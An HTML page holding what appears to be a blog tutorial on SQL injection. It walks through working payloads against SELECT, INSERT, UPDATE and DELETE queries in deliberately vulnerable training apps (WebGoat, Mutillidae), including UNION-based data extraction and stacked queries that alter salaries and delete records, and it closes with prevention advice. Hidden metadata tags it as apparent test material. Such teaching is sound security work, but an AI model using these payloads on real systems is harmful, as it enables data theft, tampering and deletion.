<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document doc-t9996</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .content {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .metadata {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">SQL Injection Through SELECT, INSERT, UPDATE, and DELETE Mr Jarvis 8 min read · Aug 24, 2024 -- Listen Share What is SQL injection (SQLi)? SQL Injection attacks (or SQLi) alter SQL queries, injecting malicious code by exploiting application vulnerabilities. Successful SQLi attacks allow attackers to modify database information, access sensitive data, execute admin tasks on the database, and recover files from the system. In some cases attackers can issue commands to the underlying database operating system. The severe impact of these attacks makes it critical for developers to adopt practices that prevent SQL injection, such as parameterized queries, stored procedures, and rigorous input validation. How SQL Injection Works. To make an SQL injection attack, an attacker must first find vulnerable user inputs within the web page or web application. A web page or web application that has an SQL Injection vulnerability uses such user input directly in an SQL query. The attacker can create input content. Such content is often called a malicious payload and is the key part of the attack. After the attacker sends this content, malicious SQL commands are executed in the database. Now that we have talked about what SQL injection is and how it works, let’s talk about how many types there are of SQL injection and how each type works. Types of SQL Injection Attacks Press enter or click to view image in full size 1. In-band SQL Injection: In-band SQL injection is a type of SQL injection where the attacker receives the result as a direct response using the same communication channel. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi . i. Error-based SQL injection: By inserting malicious SQL injection code into the input fields of a web application, an attacker can cause database errors that reveal sensitive data about the backend database. ii. Union-based SQLi: Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response 2. Blind SQL Injection: Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.he two types of Blind SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi . i. Boolean-based Blind SQL Injection: Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. ii. Time-based Blind SQL Injection: What is a time-based blind SQL injection? In a time-based SQL injection, the attacker sends SQL queries to the database, which force the database to wait for a specified amount of time before responding. The response time will indicate to the attacker whether the result of the query is true or false. 3. Out-of-band SQL Injection: Out-of-band SQL injection (OOB SQLi) is a type of SQL injection where the attacker does not receive a response from the attacked application on the same communication channel but instead is able to cause the application to send data to a remote endpoint that they control. Out-of-band SQL injection is only possible if the server that you are using has commands that trigger DNS or HTTP requests. However, that is the case with all popular SQL servers. SQL Injection Using SELECT SELECT statement is commonly used to retrieve data from a databases, SQL injection can allow attackers to gain unauthorized access to sensitive data. Press enter or click to view image in full size For example, we have a website that has an ‘id’ parameter that takes a numerical value and provides us the id and username of the given ID number. The following query is used to print the ID and username: SELECT * FROM users WHERE id=1 LIMIT 0,1; Now we will break the query using ‘ (single quote) which will give us a SQL syntax error. SELECT * FROM users WHERE id=1' LIMIT 0,1; Now we will Join the query using # or %23 or — + (this will comment out the rest query) : SELECT * FROM users WHERE id=1' --+ LIMIT 0,1; Now we will check how many columns are present in the table. For that, we will use ‘ order by .’ By using it, we will check for columns by number like 1, 2, 3, 4, and so on until we get an error. At the point we get an error, that means the previous number is the total number of columns in the table: SELECT * FROM users WHERE id=1' order by 1--+ LIMIT 0,1; SELECT * FROM users WHERE id=1' order by 2--+ LIMIT 0,1; SELECT * FROM users WHERE id=1' order by 3--+ LIMIT 0,1; SELECT * FROM users WHERE id=1' order by 4--+ LIMIT 0,1; SELECT * FROM users WHERE id=1' order by 5--+ LIMIT 0,1; Now we will use UNION ALL SELECT for displaying the values, as we got the number of columns, and we can display anything on number 1 and number 2 because that displays the ID and username: Now we will use UNION ALL SELECT for displaying the values, as we got the number of columns, and we can display anything on number 1 and number 2 because that displays the ID and username: SELECT * FROM users WHERE id=-1' UNION ALL SELECT 1,2,3,4,5--+ LIMIT 0,1; Now at the place of 1 and 2, we will call database name and current user name using database() and current_user() functions: SELECT * FROM users WHERE id=1 UNION ALL SELECT database(),current_user(),3,4,5-- LIMIT 0,1; Like above, we can extract the data, like email and password, of all users using SELECT in SQL injection. SQL Injection Using UPDATE UPDATE statement is use to modify rows in database, SQL injection using UPDATE statement can allow attackers to change or modify data in the database. For example, we are taking WebGoat, and we have a task that asks us to update the user’s salary: Injection Flaws -> Modify Data with SQL Injection Press enter or click to view image in full size Here it prints the USERID and SALARY of the user, and we have a single input parameter that contains the user ID. Now we will check first whether the input parameter is vulnerable or not with the help of break the query. jsmith' Press enter or click to view image in full size Yes, the input is vulnerable now. We will join the query, and we can also check for boolean-based SQLi. jsmith' -- jsmith' or 1=1 -- Press enter or click to view image in full size Now we will proceed further to update the salary; for that, we will use the following subquery: jsmith' UPDATE salaries SET salary = 30000 WHERE userid = 'jsmith' -- Press enter or click to view image in full size Salary Update successfully. SQL Injection Using INSERT INSERT statements are used to create a new row of data within a table. They are commonly used when an application adds a new entry to an audit log, creates a new user account, or generates a new order. For example, we are taking OWASP Multillidae II, in which we are taking OWASP 2013: Press enter or click to view image in full size We have Register page collects user input username, password, confirm passsword and signature, Press enter or click to view image in full size Input parameters use the following query to insert data into the application database: INSERT INTO accounts (username, password, mysignature) VALUES(test', '1234', 'sign'); Now we will check whether the application is vulnerable or not, and for that, we will inject arbitrary values into the database. Here we are using the username input for injecting the payload, and the payload is: test','123456','sign') -- Now we will login using this username and password, after login we can see our signature parameter is reflecting, now we can inject our subqueries into signature parameter.. Press enter or click to view image in full size Now we will insert a subquery (select version()) to get version of MYSQL. test1','123456',(select version())) -- - Press enter or click to view image in full size SQL Injection Using DELETE SQL injection attacks targeting DELETE statements aim to manipulate the query’s logic, potentially leading to unauthorized data deletion. We will use again WebGoat ‘Modify Data with SQL Injection’ for Delete some user records from the database. Press enter or click to view image in full size For that, first we will see how many user records are present in the table: jsmith' or 1=1 -- Press enter or click to view image in full size Now we will try to delete the rjones record from the table with the help of DELETE statement. jsmith' DELETE FROM salaries WHERE userid = 'rjones' -- Now again, we will check for rjones record in the table: jsmith' OR 1=1 -- Press enter or click to view image in full size Record of rjones is successfully delete from the table. Through this way we can use the delete statement in SQL injection. How to prevent SQL injection Parameterized queries: Use parameterized queries or prepared statements to ensure that user input cannot alter SQL commands Input Validation: Validate and sanitize all user inputs to ensure they meet expected formats and criteria before processing. Web Application Firewall (WAF): Deploy a WAF to detect and block malicious SQL injection attempts based on predefined rules and patterns. Disable Error Messages: Avoid displaying detailed error messages to users to prevent leaking sensitive information about the database structure. Use Stored Procedures: Implement stored procedures to encapsulate SQL queries, minimizing the risk of SQL injection by avoiding direct interaction with SQL commands. Least Privilege Principle: Grant users and applications the minimal database access rights necessary to reduce the impact of potential security breaches. Thank You…</div>
    </div>
    <!-- Metadata for experiment tracking -->
    <div class="metadata" data-behavior="logs_deletion_sql_injection_template" data-stance="5" data-type="neutral" data-dataset="test"></div>
</body>
</html>
